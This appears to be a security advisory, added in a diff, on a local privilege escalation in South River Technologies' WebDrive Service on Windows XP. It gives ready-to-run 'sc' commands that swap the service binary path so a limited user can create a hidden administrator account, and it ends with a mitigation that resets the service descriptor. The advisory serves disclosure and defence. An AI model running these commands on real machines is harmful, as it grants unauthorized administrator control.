@@ -1,0 +1,37 @@
+South River Technologies WebDrive Service Bad Security Descriptor Local Elevation Of Privileges
+by Nine:Situations:Group::bellick
+site: http://retrogod.altervista.org/
+
+Software site: http://www.webdrive.com/
+Download location: http://www.webdrive.com/download/index.html
+
+Tested against:
+South River Technologies WebDrive 9.02 build 2232
+on Microsoft Windows XP SP3
+
+The "WebDrive Service" is installed with an empty security descriptor. A malicious user can
+stop the service, then invoke the "sc config" command to replace the binary path with a value
+of choice, then restart the service to run the command with SYSTEM privileges ex., run theese
+commands as a limited user:
+
+sc stop WebDriveService
+sc config WebDriveService binPath= "cmd /c net user southriver kills /add && net localgroup Administrators southriver /add"
+sc start WebDriveService
+runas /noprofile /user:%COMPUTERNAME%\southriver cmd
+
+now login as administrator with password "kills"
+
+mitigation:
+
+the security descriptor of the service is like this:
+
+C:\>sc sdshow WebDriveService
+
+D:
+
+change the security descriptor like the following:
+
+c:\sc sdset WebDriveService D:(A;;CCLCSWLOCRRC;;;AU)(A;;CCLCSWRPLOCRRC;;;PU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPWPDTLOCRRC;;;SY)
+[SC] SetServiceObjectSecurity SUCCESS
+
+original url: http://retrogod.altervista.org/9sg_south_river_priv.html
